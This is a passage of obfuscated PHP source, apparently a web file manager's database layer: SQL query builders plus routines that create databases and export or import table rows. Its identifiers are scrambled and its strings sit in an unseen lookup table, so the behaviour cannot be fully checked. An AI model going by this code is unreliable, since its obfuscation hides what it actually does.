$ıØë—Ü× . $ŒüÃ‚à—[53] . $this->exp[$ı²İĞ¶Ä] . $ŒüÃ‚à—[53] . $¿²Ä¿ë[1]; } else { if (is_string($¿²Ä¿ë[1])) { $¿²Ä¿ë[1] = explode($ŒüÃ‚à—[50], $¿²Ä¿ë[1]); } $¿ÇíÁÂ¬ = implode($ŒüÃ‚à—[50], $this->parseValue($¿²Ä¿ë[1])); $¯¸âÌê .= $ıØë—Ü× . $ŒüÃ‚à—[53] . $this->exp[$ı²İĞ¶Ä] . $ŒüÃ‚à—[974] . $¿ÇíÁÂ¬ . $ŒüÃ‚à—[976]; } } elseif (preg_match($ŒüÃ‚à—[1092], $¿²Ä¿ë[0])) { $Ğäºµş® = is_string($¿²Ä¿ë[1]) ? explode($ŒüÃ‚à—[50], $¿²Ä¿ë[1]) : $¿²Ä¿ë[1]; $¯¸âÌê .= $ŒüÃ‚à—[974] . $ıØë—Ü× . $ŒüÃ‚à—[53] . $this->exp[$ı²İĞ¶Ä] . $ŒüÃ‚à—[53] . $this->parseValue($Ğäºµş®[0]) . $ŒüÃ‚à—[1075] . $this->parseValue($Ğäºµş®[1]) . $ŒüÃ‚à—[355]; } else { think_exception(think_lang($ŒüÃ‚à—[1078]) . $ŒüÃ‚à—[4] . $¿²Ä¿ë[0]); } } else { $ŸñÖõ­ƒ = count($¿²Ä¿ë); $™ÜßğÈÑ = $ŒüÃ‚à—[12]; if (is_string($¿²Ä¿ë[$ŸñÖõ­ƒ - 1])) { $™ÜßğÈÑ = isset($¿²Ä¿ë[$ŸñÖõ­ƒ - 1]) ? strtoupper($¿²Ä¿ë[$ŸñÖõ­ƒ - 1]) : $ŒüÃ‚à—[12]; if (in_array($™ÜßğÈÑ, array($ŒüÃ‚à—[1072], $ŒüÃ‚à—[1073], $ŒüÃ‚à—[1074]))) { $ŸñÖõ­ƒ = $ŸñÖõ­ƒ - 1; } } else { $™ÜßğÈÑ = $ŒüÃ‚à—[1072]; } for ($ûÒæ‘íŒ = 0; $ûÒæ‘íŒ < $ŸñÖõ­ƒ; $ûÒæ‘íŒ++) { $Ğäºµş® = is_array($¿²Ä¿ë[$ûÒæ‘íŒ]) ? $¿²Ä¿ë[$ûÒæ‘íŒ][1] : $¿²Ä¿ë[$ûÒæ‘íŒ]; if ($ŒüÃ‚à—[373] == strtolower($¿²Ä¿ë[$ûÒæ‘íŒ][0])) { $¯¸âÌê .= $ŒüÃ‚à—[337] . $ıØë—Ü× . $ŒüÃ‚à—[53] . $Ğäºµş® . $ŒüÃ‚à—[1089] . $™ÜßğÈÑ . $ŒüÃ‚à—[53]; } else { $Ï¥İ«ºæ = is_array($¿²Ä¿ë[$ûÒæ‘íŒ]) ? $this->exp[strtolower($¿²Ä¿ë[$ûÒæ‘íŒ][0])] : $ŒüÃ‚à—[506]; if (!$Ï¥İ«ºæ && is_array($¿²Ä¿ë[$ûÒæ‘íŒ]) && in_array($¿²Ä¿ë[$ûÒæ‘íŒ][0], array($ŒüÃ‚à—[506], $ŒüÃ‚à—[1082], $ŒüÃ‚à—[1083], $ŒüÃ‚à—[1084], $ŒüÃ‚à—[1085], $ŒüÃ‚à—[1086]))) { $Ï¥İ«ºæ = $¿²Ä¿ë[$ûÒæ‘íŒ][0]; } $¯¸âÌê .= $ŒüÃ‚à—[337] . $ıØë—Ü× . $ŒüÃ‚à—[53] . $Ï¥İ«ºæ . $ŒüÃ‚à—[53] . $this->parseValue($Ğäºµş®) . $ŒüÃ‚à—[1089] . $™ÜßğÈÑ . $ŒüÃ‚à—[53]; } } $¯¸âÌê = substr($¯¸âÌê, 0, -4); } } else { $¯¸âÌê .= $ıØë—Ü× . $ŒüÃ‚à—[1093] . $this->parseValue($¿²Ä¿ë); } return $¯¸âÌê; } protected function parseThinkWhere($Ùƒ£ú•¿, $Š¯¹Àıû) { $åÃÔåæã =& $_SERVER[ˆ¡¹µ‹Â]; $âÏüÇü• = $åÃÔåæã[12]; switch ($Ùƒ£ú•¿) { case $åÃÔåæã[428]: $âÏüÇü• = $Š¯¹Àıû; break; case $åÃÔåæã[1076]: $âÏüÇü• = is_string($Š¯¹Àıû) ? $Š¯¹Àıû : substr($this->parseWhere($Š¯¹Àıû), 6); break; case $åÃÔåæã[1094]: parse_str($Š¯¹Àıû, $±±ŸÍÓÖ); if (isset($±±ŸÍÓÖ[$åÃÔåæã[1071]])) { $†Ùøşñô = $åÃÔåæã[53] . strtoupper($±±ŸÍÓÖ[$åÃÔåæã[1071]]) . $åÃÔåæã[53]; unset($±±ŸÍÓÖ[$åÃÔåæã[1071]]); } else { $†Ùøşñô = $åÃÔåæã[1075]; } $ÁæĞÏÊÔ = array(); foreach ($±±ŸÍÓÖ as $êÏí‘¬Ò => $±üïÍ¥è) { $ÁæĞÏÊÔ[] = $this->parseKey($êÏí‘¬Ò) . $åÃÔåæã[1093] . $this->parseValue($±üïÍ¥è); } $âÏüÇü• = implode($†Ùøşñô, $ÁæĞÏÊÔ); break; } return $âÏüÇü•; } protected function parseLimit($­ÒğÈğ†) { $ûĞÃŞÁ« =& $_SERVER[ˆ¡¹µ‹Â]; return !empty($­ÒğÈğ†) ? $ûĞÃŞÁ«[51] . $­ÒğÈğ† . $ûĞÃŞÁ«[53] : $ûĞÃŞÁ«[12]; } protected function parseJoin($ŠÅ¨×Á) { $‹òª›­« =& $_SERVER[ˆ¡¹µ‹Â]; $şˆ›ù©é = $‹òª›­«[12]; if (!empty($ŠÅ¨×Á)) { if (is_array($ŠÅ¨×Á)) { foreach ($ŠÅ¨×Á as $¡÷şÕÌ´ => $•ÙÄÕÚ) { if (!1 !== stripos($•ÙÄÕÚ, $‹òª›­«[1095])) { $şˆ›ù©é .= $‹òª›­«[53] . $•ÙÄÕÚ; } else { $şˆ›ù©é .= $‹òª›­«[1096] . $•ÙÄÕÚ; } } } else { $şˆ›ù©é .= $‹òª›­«[1096] . $ŠÅ¨×Á; } } $şˆ›ù©é = preg_replace($‹òª›­«[1097], think_config($‹òª›­«[1001]) . $‹òª›­«[1098], $şˆ›ù©é); return $şˆ›ù©é; } protected function parseOrder($úßğÊÄ“) { $ªËõ—²» =& $_SERVER[ˆ¡¹µ‹Â]; if (is_array($úßğÊÄ“)) { $ĞäÚšÉ¼ = array(); foreach ($úßğÊÄ“ as $©•¼¿Äæ => $ƒûØ¨õ) { if (is_numeric($©•¼¿Äæ)) { $ĞäÚšÉ¼[] = $this->parseKey($ƒûØ¨õ); } else { $ƒûØ¨õ = in_array(strtoupper(trim($ƒûØ¨õ)), array($ªËõ—²»[1099], $ªËõ—²»[1100])) ? $ªËõ—²»[53] . $ƒûØ¨õ : $ªËõ—²»[12]; if (preg_match($ªËõ—²»[1101], $©•¼¿Äæ)) { $ĞäÚšÉ¼[] = $this->parseKey($©•¼¿Äæ) . $ƒûØ¨õ; } else { think_exception($ªËõ—²»[1102] . $©•¼¿Äæ); } } } $úßğÊÄ“ = implode($ªËõ—²»[50], $ĞäÚšÉ¼); } return !empty($úßğÊÄ“) ? $ªËõ—²»[1103] . $úßğÊÄ“ : $ªËõ—²»[12]; } protected function parseGroup($Òç°¼) { $óß¦‚Åª =& $_SERVER[ˆ¡¹µ‹Â]; return !empty($Òç°¼) ? $óß¦‚Åª[1104] . $Òç°¼ : $óß¦‚Åª[12]; } protected function parseHaving($¿¬üïğ) { $ñ„ó¡à =& $_SERVER[ˆ¡¹µ‹Â]; return !empty($¿¬üïğ) ? $ñ„ó¡à[1105] . $¿¬üïğ : $ñ„ó¡à[12]; } protected function parseComment($”ñªêË²) { $˜ÏÖ„Î =& $_SERVER[ˆ¡¹µ‹Â]; return !empty($”ñªêË²) ? $˜ÏÖ„Î[1106] . $”ñªêË² . $˜ÏÖ„Î[1107] : $˜ÏÖ„Î[12]; } protected function parseDistinct($’ÀóØÆ) { $ğ¿Ğä› =& $_SERVER[ˆ¡¹µ‹Â]; return !empty($’ÀóØÆ) ? $ğ¿Ğä›[1108] : $ğ¿Ğä›[12]; } protected function parseUnion($ÈÓÆâµ¿) { $à°†„âÔ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($ÈÓÆâµ¿)) { return $à°†„âÔ[12]; } if (isset($ÈÓÆâµ¿[$à°†„âÔ[424]])) { $®ÇÈŞ¬ò = $à°†„âÔ[1109]; unset($ÈÓÆâµ¿[$à°†„âÔ[424]]); } else { $®ÇÈŞ¬ò = $à°†„âÔ[1110]; } foreach ($ÈÓÆâµ¿ as $ôÅôù†) { $ÀÚÌ¼†[] = $®ÇÈŞ¬ò . (is_array($ôÅôù†) ? $this->buildSelectSql($ôÅôù†) : $ôÅôù†); } return implode($à°†„âÔ[53], $ÀÚÌ¼†); } public function insert($¤„¸Ë’ò, $öã‚¢Öñ = array(), $‡şŞşÔì = false) { $î£»çşÊ =& $_SERVER[ˆ¡¹µ‹Â]; $’­é¦°– = $±ø°…²ù = array(); $this->model = $öã‚¢Öñ[$î£»çşÊ[358]]; foreach ($¤„¸Ë’ò as $¡£…”â¿ => $åÈàÇë‚) { if (is_array($åÈàÇë‚) && $î£»çşÊ[373] == $åÈàÇë‚[0]) { $±ø°…²ù[] = $this->parseKey($¡£…”â¿); $’­é¦°–[] = $åÈàÇë‚[1]; } elseif (is_scalar($åÈàÇë‚) || is_null($åÈàÇë‚)) { $±ø°…²ù[] = $this->parseKey($¡£…”â¿); $’­é¦°–[] = $this->parseValue($åÈàÇë‚); } } $» £¸İº = ($‡şŞşÔì ? $î£»çşÊ[978] : $î£»çşÊ[979]) . $î£»çşÊ[980] . $this->parseTable($öã‚¢Öñ[$î£»çşÊ[356]]) . $î£»çşÊ[974] . implode($î£»çşÊ[50], $±ø°…²ù) . $î£»çşÊ[975] . implode($î£»çşÊ[50], $’­é¦°–) . $î£»çşÊ[976]; $» £¸İº .= $this->parseLock(isset($öã‚¢Öñ[$î£»çşÊ[918]]) ? $öã‚¢Öñ[$î£»çşÊ[918]] : !1); $» £¸İº .= $this->parseComment(!empty($öã‚¢Öñ[$î£»çşÊ[430]]) ? $öã‚¢Öñ[$î£»çşÊ[430]] : $î£»çşÊ[12]); return $this->execute($» £¸İº, $this->parseBind(!empty($öã‚¢Öñ[$î£»çşÊ[361]]) ? $öã‚¢Öñ[$î£»çşÊ[361]] : array())); } public function selectInsert($—¡Œè¹ç, $¡±ôş€, $ÁŞ¥ôÈò = array()) { $Â¸×¦Á =& $_SERVER[ˆ¡¹µ‹Â]; $this->model = $ÁŞ¥ôÈò[$Â¸×¦Á[358]]; if (is_string($—¡Œè¹ç)) { $—¡Œè¹ç = explode($Â¸×¦Á[50], $—¡Œè¹ç); } array_walk($—¡Œè¹ç, array($this, $Â¸×¦Á[977])); $ë­ÀÃñ = $Â¸×¦Á[1111] . $this->parseTable($¡±ôş€) . $Â¸×¦Á[974] . implode($Â¸×¦Á[50], $—¡Œè¹ç) . $Â¸×¦Á[1089]; $ë­ÀÃñ .= $this->buildSelectSql($ÁŞ¥ôÈò); return $this->execute($ë­ÀÃñ, $this->parseBind(!empty($ÁŞ¥ôÈò[$Â¸×¦Á[361]]) ? $ÁŞ¥ôÈò[$Â¸×¦Á[361]] : array())); } public function update($¤úÒñœæ, $îò¨üë») { $·ÀÍ÷ßî =& $_SERVER[ˆ¡¹µ‹Â]; $this->model = $îò¨üë»[$·ÀÍ÷ßî[358]]; $˜–ñë = $·ÀÍ÷ßî[1112] . $this->parseTable($îò¨üë»[$·ÀÍ÷ßî[356]]) . $this->parseSet($¤úÒñœæ) . $this->parseWhere(!empty($îò¨üë»[$·ÀÍ÷ßî[352]]) ? $îò¨üë»[$·ÀÍ÷ßî[352]] : $·ÀÍ÷ßî[12]) . $this->parseOrder(!empty($îò¨üë»[$·ÀÍ÷ßî[441]]) ? $îò¨üë»[$·ÀÍ÷ßî[441]] : $·ÀÍ÷ßî[12]) . $this->parseLimit(!empty($îò¨üë»[$·ÀÍ÷ßî[368]]) ? $îò¨üë»[$·ÀÍ÷ßî[368]] : $·ÀÍ÷ßî[12]) . $this->parseLock(isset($îò¨üë»[$·ÀÍ÷ßî[918]]) ? $îò¨üë»[$·ÀÍ÷ßî[918]] : !1) . $this->parseComment(!empty($îò¨üë»[$·ÀÍ÷ßî[430]]) ? $îò¨üë»[$·ÀÍ÷ßî[430]] : $·ÀÍ÷ßî[12]); return $this->execute($˜–ñë, $this->parseBind(!empty($îò¨üë»[$·ÀÍ÷ßî[361]]) ? $îò¨üë»[$·ÀÍ÷ßî[361]] : array())); } public function delete($İÏ†ğÙ = array()) { $–ÍÓ«ñ­ =& $_SERVER[ˆ¡¹µ‹Â]; $this->model = $İÏ†ğÙ[$–ÍÓ«ñ­[358]]; $ùãı©‘Û = $–ÍÓ«ñ­[1113] . $this->parseTable($İÏ†ğÙ[$–ÍÓ«ñ­[356]]) . $this->parseWhere(!empty($İÏ†ğÙ[$–ÍÓ«ñ­[352]]) ? $İÏ†ğÙ[$–ÍÓ«ñ­[352]] : $–ÍÓ«ñ­[12]) . $this->parseOrder(!empty($İÏ†ğÙ[$–ÍÓ«ñ­[441]]) ? $İÏ†ğÙ[$–ÍÓ«ñ­[441]] : $–ÍÓ«ñ­[12]) . $this->parseLimit(!empty($İÏ†ğÙ[$–ÍÓ«ñ­[368]]) ? $İÏ†ğÙ[$–ÍÓ«ñ­[368]] : $–ÍÓ«ñ­[12]) . $this->parseLock(isset($İÏ†ğÙ[$–ÍÓ«ñ­[918]]) ? $İÏ†ğÙ[$–ÍÓ«ñ­[918]] : !1) . $this->parseComment(!empty($İÏ†ğÙ[$–ÍÓ«ñ­[430]]) ? $İÏ†ğÙ[$–ÍÓ«ñ­[430]] : $–ÍÓ«ñ­[12]); return $this->execute($ùãı©‘Û, $this->parseBind(!empty($İÏ†ğÙ[$–ÍÓ«ñ­[361]]) ? $İÏ†ğÙ[$–ÍÓ«ñ­[361]] : array())); } public function select($‡×»ÎÑº = array()) { $Å¾Ää­× =& $_SERVER[ˆ¡¹µ‹Â]; $this->model = $‡×»ÎÑº[$Å¾Ää­×[358]]; $ÃÙ§ĞÙÖ = $this->buildSelectSql($‡×»ÎÑº); $ê­ò½—Ç = isset($‡×»ÎÑº[$Å¾Ää­×[425]]) ? $‡×»ÎÑº[$Å¾Ää­×[425]] : !1; if ($ê­ò½—Ç) { $é«æçÀÑ = is_string($ê­ò½—Ç[$Å¾Ää­×[97]]) ? $ê­ò½—Ç[$Å¾Ää­×[97]] : $Å¾Ää­×[1114] . md5($ÃÙ§ĞÙÖ); $ÒñÇüõØ = think_cache($é«æçÀÑ, $Å¾Ää­×[12], $ê­ò½—Ç); if (!1 !== $ÒñÇüõØ) { return $ÒñÇüõØ; } } $¥¢óçºñ = $this->query($ÃÙ§ĞÙÖ, $this->parseBind(!empty($‡×»ÎÑº[$Å¾Ää­×[361]]) ? $‡×»ÎÑº[$Å¾Ää­×[361]] : array())); if ($ê­ò½—Ç && !1 !== $¥¢óçºñ) { think_cache($é«æçÀÑ, $¥¢óçºñ, $ê­ò½—Ç); } return $¥¢óçºñ; } public function buildSelectSql($ä’Û£ê = array()) { $úÊ÷®øÂ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($ä’Û£ê[$úÊ÷®øÂ[429]])) { if (strpos($ä’Û£ê[$úÊ÷®øÂ[429]], $úÊ÷®øÂ[50])) { list($¢Ö²ˆçÑ, $Îë¼î§) = explode($úÊ÷®øÂ[50], $ä’Û£ê[$úÊ÷®øÂ[429]]); } else { $¢Ö²ˆçÑ = $ä’Û£ê[$úÊ÷®øÂ[429]]; } $¢Ö²ˆçÑ = $¢Ö²ˆçÑ ? $¢Ö²ˆçÑ : 1; $Îë¼î§ = isset($Îë¼î§) ? $Îë¼î§ : (is_numeric($ä’Û£ê[$úÊ÷®øÂ[368]]) ? $ä’Û£ê[$úÊ÷®øÂ[368]] : 20); $€¨öºĞ = $Îë¼î§ * ((int) $¢Ö²ˆçÑ - 1); $ä’Û£ê[$úÊ÷®øÂ[368]] = $€¨öºĞ . $úÊ÷®øÂ[50] . $Îë¼î§; } if (think_config($úÊ÷®øÂ[1115])) { $£Ìù³¡Í = $úÊ÷®øÂ[1116] . md5(serialize($ä’Û£ê)); $°‰ÔØÖº = think_cache($£Ìù³¡Í); if ($°‰ÔØÖº) { return $°‰ÔØÖº; } } $¥Êá½ş¥ = $this->parseSql($this->selectSql, $ä’Û£ê); $¥Êá½ş¥ .= $this->parseLock(isset($ä’Û£ê[$úÊ÷®øÂ[918]]) ? $ä’Û£ê[$úÊ÷®øÂ[918]] : !1); if (isset($£Ìù³¡Í)) { think_cache($£Ìù³¡Í, $¥Êá½ş¥); } return $¥Êá½ş¥; } public function parseSql($ìÙãØÍˆ, $ßš¶€Æè = array()) { $Å¦şÖƒß =& $_SERVER[ˆ¡¹µ‹Â]; $ìÙãØÍˆ = str_replace(array($Å¦şÖƒß[1117], $Å¦şÖƒß[1118], $Å¦şÖƒß[1119], $Å¦şÖƒß[1120], $Å¦şÖƒß[1121], $Å¦şÖƒß[1122], $Å¦şÖƒß[1123], $Å¦şÖƒß[1124], $Å¦şÖƒß[1125], $Å¦şÖƒß[1126], $Å¦şÖƒß[1127]), array($this->parseTable("{$ßš¶€Æè[$Å¦şÖƒß[356]]}"), $this->parseDistinct(isset($ßš¶€Æè[$Å¦şÖƒß[1128]]) ? $ßš¶€Æè[$Å¦şÖƒß[1128]] : !1), $this->parseField(!empty($ßš¶€Æè[$Å¦şÖƒß[350]]) ? $ßš¶€Æè[$Å¦şÖƒß[350]] : $Å¦şÖƒß[220]), $this->parseJoin(!empty($ßš¶€Æè[$Å¦şÖƒß[359]]) ? $ßš¶€Æè[$Å¦şÖƒß[359]] : $Å¦şÖƒß[12]), $this->parseWhere(!empty($ßš¶€Æè[$Å¦şÖƒß[352]]) ? $ßš¶€Æè[$Å¦şÖƒß[352]] : $Å¦şÖƒß[12]), $this->parseGroup(!empty($ßš¶€Æè[$Å¦şÖƒß[578]]) ? $ßš¶€Æè[$Å¦şÖƒß[578]] : $Å¦şÖƒß[12]), $this->parseHaving(!empty($ßš¶€Æè[$Å¦şÖƒß[1129]]) ? $ßš¶€Æè[$Å¦şÖƒß[1129]] : $Å¦şÖƒß[12]), $this->parseOrder(!empty($ßš¶€Æè[$Å¦şÖƒß[441]]) ? $ßš¶€Æè[$Å¦şÖƒß[441]] : $Å¦şÖƒß[12]), $this->parseLimit(!empty($ßš¶€Æè[$Å¦şÖƒß[368]]) ? $ßš¶€Æè[$Å¦şÖƒß[368]] : $Å¦şÖƒß[12]), $this->parseUnion(!empty($ßš¶€Æè[$Å¦şÖƒß[423]]) ? $ßš¶€Æè[$Å¦şÖƒß[423]] : $Å¦şÖƒß[12]), $this->parseComment(!empty($ßš¶€Æè[$Å¦şÖƒß[430]]) ? $ßš¶€Æè[$Å¦şÖƒß[430]] : $Å¦şÖƒß[12])), $ìÙãØÍˆ); return $ìÙãØÍˆ; } public function getLastSql($©º€Óé = '') { return $©º€Óé ? $this->modelSql[$©º€Óé] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($úƒÎ¸Ÿ‰) { return addslashes($úƒÎ¸Ÿ‰); } public function setModel($ş»¬æ£) { $this->model = $ş»¬æ£; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ö·¿Ÿíó = array()) { $®ŞêèÔ¼ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($ö·¿Ÿíó)) { $ö·¿Ÿíó = $GLOBALS[$®ŞêèÔ¼[6]][$®ŞêèÔ¼[21]]; } $this->database = $ö·¿Ÿíó; } public function model($µÌ«Â£ú = '') { return new ModelBase($µÌ«Â£ú, $_SERVER[ˆ¡¹µ‹Â][12], $this->database); } public function db($íğÆÉ²ı = false) { $Êôæİä =& $_SERVER[ˆ¡¹µ‹Â]; $‹Ç®¸Æ´ = array_change_key_case($this->database); if ($this->dbType() == $Êôæİä[13] || !$íğÆÉ²ı) { return $this->model()->db(); } $âøæ‚¥ = $‹Ç®¸Æ´[$Êôæİä[1043]]; $‹Ç®¸Æ´[$Êôæİä[1043]] = $Êôæİä[12]; if ($‹Ç®¸Æ´[$Êôæİä[1038]] == $Êôæİä[1035]) { $•¯òµß = $‹Ç®¸Æ´[$Êôæİä[1044]]; $‹Ç®¸Æ´[$Êôæİä[1044]] = substr($•¯òµß, 0, strrpos($•¯òµß, $Êôæİä[1130])); } $this->database = $‹Ç®¸Æ´; $şôö€Ì¥ = $this->model()->db(); try { $ÑŞÜ‚íã = $şôö€Ì¥->execute("\163\x68\x6f\167\40\x64\141\x74\x61\142\x61\163\x65\163\x20\x6c\151\153\x65\x20\47{$âøæ‚¥}\47"); } catch (Exception $“„Ùî†Ú) { } if (!$ÑŞÜ‚íã) { $şôö€Ì¥->execute("\143\162\145\x61\164\x65\40\x64\141\x74\x61\142\x61\x73\x65\x20\140{$âøæ‚¥}\x60"); } $‹Ç®¸Æ´[$Êôæİä[1043]] = $âøæ‚¥; if ($‹Ç®¸Æ´[$Êôæİä[1038]] == $Êôæİä[1035]) { $‹Ç®¸Æ´[$Êôæİä[1044]] .= $Êôæİä[1130] . $âøæ‚¥; } $this->database = $‹Ç®¸Æ´; $şôö€Ì¥->execute("\x75\x73\145\40\140{$âøæ‚¥}\x60"); return $şôö€Ì¥; } public function createTable($×ÆÀõÆ, &$¤ä¬ßê‚) { $˜¦÷—Ì =& $_SERVER[ˆ¡¹µ‹Â]; if (!IO::exist($×ÆÀõÆ)) { ActionCall($˜¦÷—Ì[1131], !0, 0); show_json(LNG($˜¦÷—Ì[1132]), !1); } $ùƒôæ°¢ = $this->model()->db(); $…¹¥Â¡‘ = sqlSplit(IO::getContent($×ÆÀõÆ)); foreach ($…¹¥Â¡‘ as $ò®ÏõÌ) { $óé¨àîñ = stripos($ò®ÏõÌ, $˜¦÷—Ì[1133]) === 0; if ($óé¨àîñ) { $¤ä¬ßê‚->task[$˜¦÷—Ì[1134]] += 1; } $ùƒôæ°¢->execute($ò®ÏõÌ); if ($óé¨àîñ) { preg_match($˜¦÷—Ì[1135], $ò®ÏõÌ, $—Òª“ÑÒ); $¤ä¬ßê‚->task[$˜¦÷—Ì[1136]] = $—Òª“ÑÒ[1]; $¤ä¬ßê‚->update(1); } } } public function insertTable($Íòíö£©, &$äéòè—±) { $µçßûÒÎ =& $_SERVER[ˆ¡¹µ‹Â]; $ïâ…Ôâ = $this->model()->db(); $ó…öñô¸ = $«ŒÓ  ? array($«ŒÓ ) : $ïâ…Ôâ->getTables(); foreach ($Íòíö£© as $¾ÒÖ›òô) { $«ŒÓ  = basename($¾ÒÖ›òô, $µçßûÒÎ[863]); if (!in_array($«ŒÓ , $ó…öñô¸)) { continue; } $äéòè—±->task[$µçßûÒÎ[1136]] = $«ŒÓ ; if (get_filesize($¾ÒÖ›òô) == 0) { continue; } $Ä™ëåë„ = $this->sqlToDb($¾ÒÖ›òô, $äéòè—±); if (!$Ä™ëåë„) { ActionCall($µçßûÒÎ[1131], !0, 0); show_json(LNG($µçßûÒÎ[1137]) . "\x5b{$«ŒÓ }\135", !1); } } } public function sqlFromDb($³ëºê§œ, $•¸¤é®˜, &$¦ÎƒÌí’, $ù—šäë = '') { if ($¦ÎƒÌí’) { $¦ÎƒÌí’->task[$_SERVER[ˆ¡¹µ‹Â][1136]] = $³ëºê§œ; } $êö¼¤·® = $this->model($³ëºê§œ); $ÑÒÜœµ± = 0; $ƒ» Ì»µ = 0; $’È²Ìú¬ = 10000; $‹ÌùÂ‘Û = fopen($•¸¤é®˜, $_SERVER[ˆ¡¹µ‹Â][1138]); $ïû‰Ğ•ƒ = $êö¼¤·®->getPk(); $À°Ò—Â… = $êö¼¤·®->getDbFields(); $ÅŠà‰åÏ = $_SERVER[ˆ¡¹µ‹Â][12]; if ($GLOBALS[$_SERVER[ˆ¡¹µ‹Â][862]] && in_array($³ëºê§œ, array($_SERVER[ˆ¡¹µ‹Â][1139], $_SERVER[ˆ¡¹µ‹Â][1140]))) { $ÅŠà‰åÏ = $³ëºê§œ; } do { $°½—å÷¶ = array($ïû‰Ğ•ƒ => array($_SERVER[ˆ¡¹µ‹Â][1085], $ƒ» Ì»µ)); $‰®±í“¡ = $êö¼¤·®->where($°½—å÷¶)->field($À°Ò—Â…)->order($ïû‰Ğ•ƒ . $_SERVER[ˆ¡¹µ‹Â][1141])->limit($’È²Ìú¬)->select(); $‰®±í“¡ = !empty($‰®±í“¡) ? $‰®±í“¡ : array(); if (!($éÔ£Òğõ = count($‰®±í“¡))) { break; } $„¾äâÑ  = end($‰®±í“¡); $ƒ» Ì»µ = $„¾äâÑ [$ïû‰Ğ•ƒ]; $ÆÜô´Å = array(); foreach ($‰®±í“¡ as $™„îİ¨Œ) { if ($ÅŠà‰åÏ) { if ($³ëºê§œ == $_SERVER[ˆ¡¹µ‹Â][1139]) { if ($™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][33]] == $_SERVER[ˆ¡¹µ‹Â][1142]) { $¶ãÖŒÛï = json_decode($™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][450]], !0); if ($¶ãÖŒÛï[$_SERVER[ˆ¡¹µ‹Â][32]] == $GLOBALS[$_SERVER[ˆ¡¹µ‹Â][862]] && $¶ãÖŒÛï[$_SERVER[ˆ¡¹µ‹Â][817]] != 1) { continue; } } } else { if ($™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][33]] == $_SERVER[ˆ¡¹µ‹Â][1143] && $™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][97]] == $_SERVER[ˆ¡¹µ‹Â][857]) { continue; } } } if ($ù—šäë) { $™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][87]] = "\173\x69\x6f\72{$ù—šäë}\x7d" . substr($™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][87]], strlen("\x7b\x69\157\x3a{$™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][892]]}\175")); $™„îİ¨Œ[$_SERVER[ˆ¡¹µ‹Â][892]] = $ù—šäë; } $ÆÜô´Å[] = $_SERVER[ˆ¡¹µ‹Â][1144] . $this->sqlEncode($™„îİ¨Œ) . $_SERVER[ˆ¡¹µ‹Â][1145]; } $¼Õ¯†Ÿô = "\x49\116\123\x45\x52\x54\x20\111\x4e\124\117\x20\140{$³ëºê§œ}\140\40\50\x60" . implode($_SERVER[ˆ¡¹µ‹Â][1146], $À°Ò—Â…) . $_SERVER[ˆ¡¹µ‹Â][1147]; fwrite($‹ÌùÂ‘Û, $¼Õ¯†Ÿô . implode($_SERVER[ˆ¡¹µ‹Â][1148], $ÆÜô´Å) . $_SERVER[ˆ¡¹µ‹Â][74] . PHP_EOL); $ÑÒÜœµ± += $éÔ£Òğõ; if ($¦ÎƒÌí’) { $¦ÎƒÌí’->update($éÔ£Òğõ); } } while ($’È²Ìú¬ == $éÔ£Òğõ); fclose($‹ÌùÂ‘Û); return $ÑÒÜœµ±; } public function sqlToDb($À•Ãó…, &$²õ€óù‰) { $‡Ã¤æ§Ô =& $_SERVER[ˆ¡¹µ‹Â]; $ßä“ÉË× = $this->model()->db(); $Æìƒéİ = @fopen($À•Ãó…, $‡Ã¤æ§Ô[1149]); if (!$Æìƒéİ) { return !1; } $§Û¼ş€ğ = 0; $ÈìÊƒó™ = $‡Ã¤æ§Ô[12]; $ë†ÄĞáÙ = array(); $ÌóÛÙ©ê = $this->dbType(); $Ìê™¶» = $ÌóÛÙ©ê == $‡Ã¤æ§Ô[13] ? 500 : 2000; $º‡©›î = basename($À•Ãó…, $‡Ã¤æ§Ô[863]); $×ì¸Î¸Ê = 0; $´ª’Óƒ‰ = 4194304; while (!feof($Æìƒéİ)) { $«ëª«Íş = trim(fgets($Æìƒéİ)); if (!$«ëª«Íş) { continue; } $ß‘×€‚ = $this->sqlDecode($«ëª«Íş, $ÌóÛÙ©ê, $º‡©›î); if (stripos($ß‘×€‚, $‡Ã¤æ§Ô[431]) === 0) { if (!$ÈìÊƒó™) { $ÈìÊƒó™ = $ß‘×€‚ . $‡Ã¤æ§Ô[53]; } continue; } if ($²õ€óù‰) { $²õ€óù‰->task[$‡Ã¤æ§Ô[1134]] += 1; } $§Û¼ş€ğ++; $ë†ÄĞáÙ[] = rtrim(rtrim(trim($ß‘×€‚), $‡Ã¤æ§Ô[50]), $‡Ã¤æ§Ô[74]); $ïÉĞÆà® = null; $é’¤¸è“ = strlen($ß‘×€‚); $×ì¸Î¸Ê += $é’¤¸è“; $ü÷İÏ‹® = strlen($ÈìÊƒó™) + $×ì¸Î¸Ê + (count($ë†ÄĞáÙ) - 1); if ($ü÷İÏ‹® >= $´ª’Óƒ‰) { $ïÉĞÆà® = array_pop($ë†ÄĞáÙ); if ($§Û¼ş€ğ > 1) { $§Û¼ş€ğ--; } } if ($§Û¼ş€ğ >= $Ìê™¶» || $ïÉĞÆà®) { $ß‘×€‚ = $ÈìÊƒó™ . implode($‡Ã¤æ§Ô[50], $ë†ÄĞáÙ); if (!$ßä“ÉË×->execute($ß‘×€‚)) { return !1; } if ($²õ€óù‰) { $²õ€óù‰->update($§Û¼ş€ğ); } $ë†ÄĞáÙ = array(); $§Û¼ş€ğ = 0; $×ì¸Î¸Ê = 0; if ($ïÉĞÆà®) { $ë†ÄĞáÙ = array($ïÉĞÆà®); $§Û¼ş€ğ = 1; $×ì¸Î¸Ê = $é’¤¸è“; } } } fclose($Æìƒéİ); if (!empty($ë†ÄĞáÙ)) { $ß‘×€‚ = $ÈìÊƒó™ . implode($‡Ã¤æ§Ô[50], $ë†ÄĞáÙ); if (!$ßä“ÉË×->execute($ß‘×€‚)) { return !1; } if 